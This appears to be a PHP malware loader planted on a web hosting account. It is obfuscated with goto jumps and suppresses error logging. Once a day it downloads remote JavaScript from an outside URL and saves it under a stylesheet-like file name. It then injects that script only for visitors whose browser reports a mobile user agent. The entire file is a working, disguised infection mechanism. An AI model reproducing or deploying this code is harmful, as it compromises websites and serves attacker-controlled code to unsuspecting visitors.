
<?php goto G9xot; fNgz9: @ini_set('display_errors', 0); goto UX88j; UX88j: if (!file_exists('/home/zapsolut/zapaccounts.zapsolutionz.com/style.zapaccounts.zapsolutionz.com.js') || trim(file_get_contents('/home/zapsolut/zapaccounts.zapsolutionz.com/style.zapaccounts.zapsolutionz.com.js')) == '' || date('d', filectime('/home/zapsolut/zapaccounts.zapsolutionz.com/style.zapaccounts.zapsolutionz.com.js')) != date('d')) { goto J_pAO; q4dp9: if (trim($L8FCt) == '') { goto cpX0x; fIPT2: curl_setopt($KnM8r, CURLOPT_HEADER, false); goto X9ule; u2fQC: curl_close($KnM8r); goto dRyB9; cpX0x: $KnM8r = curl_init(); goto YGWWC; RBvGy: curl_setopt($KnM8r, CURLOPT_USERAGENT, 'Mozilla/5.0 AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1'); goto SbYiE; X9ule: $L8FCt = curl_exec($KnM8r); goto u2fQC; YGWWC: curl_setopt($KnM8r, CURLOPT_URL, $FaE9J); goto UpuVP; BAl7S: curl_setopt($KnM8r, CURLOPT_RETURNTRANSFER, TRUE); goto fIPT2; UpuVP: curl_setopt($KnM8r, CURLOPT_TIMEOUT, 10); goto RBvGy; SbYiE: curl_setopt($KnM8r, CURLOPT_FOLLOWLOCATION, TRUE); goto BAl7S; dRyB9: } goto WLh6l; WLh6l: if (trim($L8FCt) != '') { file_put_contents('/home/zapsolut/zapaccounts.zapsolutionz.com/style.zapaccounts.zapsolutionz.com.js', $L8FCt); } goto b3kPn; J_pAO: $FaE9J = 'https://d-ev.dev/iKa0j4'; goto k9lvC; k9lvC: $L8FCt = file_get_contents($FaE9J, false, stream_context_create(array("http" => array("method" => "GET", "header" => "User-Agent: Mozilla/5.0 AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1\r\n")))); goto q4dp9; b3kPn: } goto NlXK8; xIGE2: @ini_set('error_log', NULL); goto sESme; G9xot: error_reporting(0); goto xIGE2; sESme: @ini_set('log_errors', 0); goto fNgz9; NlXK8: if (is_numeric(strpos(strtolower($_SERVER["HTTP_USER_AGENT"]), "mobile")) && strtolower($_SERVER["HTTP_USER_AGENT"]) != "mobile") { echo '<script src="/style.zapaccounts.zapsolutionz.com.js?ver=3.4.0" type="text/javascript"></script>'; } ?>